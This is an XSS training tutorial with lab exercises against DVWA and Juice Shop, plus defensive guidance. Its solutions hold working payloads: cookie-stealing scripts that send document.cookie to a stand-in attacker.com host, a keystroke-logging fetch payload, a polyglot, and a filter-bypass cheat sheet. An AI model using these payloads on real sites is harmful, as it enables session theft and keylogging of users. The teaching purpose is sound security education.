# 🌐 Cross-Site Scripting (XSS) Tutorial

**Difficulty**: ⭐⭐⭐ (Beginner)  
**Time Required**: 2-3 hours  
**Applications**: DVWA, Juice Shop, WebGoat

## 📚 Table of Contents
1. [What is XSS?](#what-is-xss)
2. [Types of XSS](#types-of-xss)
3. [How XSS Works](#how-xss-works)
4. [Hands-On Practice](#hands-on-practice)
5. [Defense Strategies](#defense-strategies)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand the three types of XSS vulnerabilities
- ✅ Identify XSS injection points in web applications
- ✅ Execute different XSS attack payloads
- ✅ Steal cookies and perform actions on behalf of users
- ✅ Implement proper defenses against XSS

---

## What is XSS?

Cross-Site Scripting (XSS) is a type of injection attack where malicious scripts are injected into trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.

### 🎬 Real-World Impact

XSS vulnerabilities have been found in:
- **Facebook** (2019): Stored XSS in photo description
- **Steam** (2019): XSS in user profiles affecting millions
- **eBay** (2017): Persistent XSS in product listings
- **Twitter** (2010): The infamous "onMouseOver" worm

### 💰 What Attackers Can Do

With XSS, attackers can:
- 🍪 Steal session cookies
- 📸 Capture keystrokes
- 🎭 Deface websites
- 🎣 Perform phishing attacks
- 🔗 Redirect users to malicious sites

---

## Types of XSS

### 1. Reflected XSS (Non-Persistent)
The malicious script comes from the current HTTP request.

**Example**: Search results that echo user input
```
https://vulnerable-site.com/search?q=<script>alert('XSS')</script>
```

### 2. Stored XSS (Persistent)
The malicious script is stored on the target server (database, message forum, visitor log, etc.)

**Example**: Comment section that stores and displays user input

### 3. DOM-Based XSS
The vulnerability exists in client-side code rather than server-side code.

**Example**: JavaScript that uses `location.hash` unsafely

---

## How XSS Works

### The Vulnerable Code

**PHP Example (Reflected XSS):**
```php
<?php
$search = $_GET['search'];
echo "You searched for: " . $search;
?>
```

**JavaScript Example (DOM XSS):**
```javascript
document.getElementById('welcome').innerHTML = 
    "Welcome " + location.hash.substring(1);
```

### The Attack Flow

1. **Attacker** crafts malicious input containing JavaScript
2. **Application** includes this input in the HTML response
3. **Browser** executes the JavaScript in the victim's context
4. **Attacker** gains access to cookies, session tokens, etc.

---

## Hands-On Practice

### 🏃 Exercise 1: Basic Reflected XSS (DVWA)

**Setup**: Start DVWA and navigate to XSS (Reflected) page  
**Goal**: Display an alert box with your message

<details>
<summary>💡 Hint 1: Understanding the input</summary>

Look at the form. It asks for your name. Try entering a normal name first and see how it's displayed on the page. Where does your input appear in the response?

</details>

<details>
<summary>💡 Hint 2: Breaking out of context</summary>

Your input is being inserted into the HTML. What if you could add HTML tags? Try entering:
```
John<h1>Test</h1>
```

Did it render as HTML?

</details>

<details>
<summary>💡 Hint 3: Adding JavaScript</summary>

If HTML works, JavaScript should too! The `<script>` tag executes JavaScript. What would happen if you enter a script tag?

</details>

<details>
<summary>🔓 Solution</summary>

Enter in the name field:
```html
<script>alert('XSS')</script>
```

**Why it works**: The application takes your input and inserts it directly into the HTML without any sanitization:
```html
Hello <script>alert('XSS')</script>
```

The browser sees the script tag and executes it!

**Alternative payloads**:
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

</details>

---

### 🏃 Exercise 2: Stored XSS - Cookie Theft (DVWA)

**Setup**: Navigate to XSS (Stored) page  
**Goal**: Steal cookies and send them to your server

<details>
<summary>💡 Hint 1: Where is input stored?</summary>

This is a guestbook. Try posting a normal message first. Notice that your message is saved and displayed to everyone who visits the page. This is different from reflected XSS!

</details>

<details>
<summary>💡 Hint 2: Accessing cookies</summary>

In JavaScript, you can access cookies with `document.cookie`. Try this payload first:
```html
<script>alert(document.cookie)</script>
```

</details>

<details>
<summary>💡 Hint 3: Sending data to external server</summary>

To steal cookies, you need to send them somewhere. You can use:
- `fetch()` to make HTTP requests
- `Image` object to make GET requests
- `XMLHttpRequest` for more control

Think about how to combine `document.cookie` with these methods.

</details>

<details>
<summary>🔓 Solution</summary>

**Step 1**: Set up a listener (use RequestBin or ngrok)

**Step 2**: Post this message:
```html
<script>
var img = new Image();
img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

**More sophisticated payload**:
```html
<script>
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        url: window.location.href,
        userAgent: navigator.userAgent
    })
});
</script>
```

**Explanation**: Every visitor to the guestbook will execute this script, sending their cookies to your server!

</details>

---

### 🏃 Exercise 3: DOM XSS (Juice Shop)

**Setup**: Navigate to Juice Shop search page  
**Goal**: Exploit DOM XSS in the search functionality

<details>
<summary>💡 Hint 1: Inspect the JavaScript</summary>

Open Developer Tools and look at the JavaScript. Search for something and watch how the search term is handled. Is it inserted into the DOM directly?

</details>

<details>
<summary>💡 Hint 2: Understanding the # fragment</summary>

DOM XSS often involves the URL fragment (after #). Try:
```
http://localhost:3001/#/search?q=test
```

How is the 'q' parameter used?

</details>

<details>
<summary>💡 Hint 3: Breaking the JavaScript context</summary>

If the search term is inserted into JavaScript, you might need to break out of a string. Try:
```
test'); alert('XSS
```

</details>

<details>
<summary>🔓 Solution</summary>

Navigate to:
```
http://localhost:3001/#/search?q=<iframe src="javascript:alert(`XSS`)">
```

**Alternative exploits**:
```
<img src=x onerror="alert(1)">
<script>alert(String.fromCharCode(88,83,83))</script>
```

**Advanced payload** (keylogger):
```javascript
<img src=x onerror="
document.onkeypress = function(e) {
    fetch('/steal?key=' + e.key);
}
">
```

</details>

---

### 🏃 Challenge: The XSS Polyglot

**Goal**: Create a single XSS payload that works in multiple contexts

<details>
<summary>🎯 Challenge Description</summary>

Your payload should work whether it's inserted:
1. Between HTML tags
2. Inside a JavaScript string
3. Inside an HTML attribute
4. Inside a script tag

This is useful when you don't know the exact context.

</details>

<details>
<summary>💡 Hint: Building blocks</summary>

Think about what characters can:
- Close HTML attributes: `"`
- Close JavaScript strings: `'`
- Create new tags: `<>`
- Execute JavaScript: `javascript:`

</details>

<details>
<summary>🔓 Solution</summary>

The classic XSS polyglot:
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Breakdown**:
- `jaVasCript:` - works in URLs
- `/*-/*\`/*\\\`/*'/*"/**/` - escapes various string contexts
- `oNcliCk=alert()` - event handler
- `</stYle/</titLe/</teXtarEa/</scRipt/` - closes various tags
- `\x3csVg/oNloAd=alert()//>\x3e` - SVG with event handler

</details>

---

## Defense Strategies

### 🛡️ Primary Defenses

1. **Output Encoding**
```javascript
// HTML context
function escapeHtml(str) {
    return str
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#x27;");
}
```

2. **Content Security Policy (CSP)**
```html
Content-Security-Policy: default-src 'self'; script-src 'self'
```

3. **Use Safe APIs**
```javascript
// Bad
element.innerHTML = userInput;

// Good
element.textContent = userInput;
```

4. **Input Validation**
```javascript
// Whitelist approach
if (!/^[a-zA-Z0-9\s]+$/.test(userInput)) {
    throw new Error("Invalid input");
}
```

### 🛡️ Framework-Specific Protections

**React**: Automatically escapes values
```jsx
// Safe by default
<div>{userInput}</div>

// Dangerous (avoid!)
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

**Angular**: Sanitizes by default
```typescript
// Safe
<div [innerText]="userInput"></div>

// Requires sanitization
<div [innerHTML]="sanitizer.sanitize(SecurityContext.HTML, userInput)"></div>
```

---

## 📊 XSS Payload Cheat Sheet

### Event Handlers
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<marquee onstart=alert(1)>
<input autofocus onfocus=alert(1)>
```

### Without Spaces
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

### Filter Bypasses
```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- Unicode -->
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
```

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Identify reflected, stored, and DOM-based XSS
- [ ] Execute basic XSS payloads
- [ ] Steal cookies using XSS
- [ ] Bypass basic filters
- [ ] Implement proper encoding defenses

---

## Additional Resources

### 🔧 Tools
- **XSStrike**: Advanced XSS detection suite
- **BeEF**: Browser Exploitation Framework
- **XSSHunter**: Blind XSS testing platform

### 📖 Further Reading
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Game by Google](https://xss-game.appspot.com/)

### 🎥 Video Resources
- [LiveOverflow - XSS Tutorial Series](https://www.youtube.com/watch?v=EoaDgUgS6QA)
- [STÖK - XSS Explained](https://www.youtube.com/watch?v=PPzn4K2ZjfU)

---

**Next Tutorial**: [Broken Authentication](broken-authentication.md) → 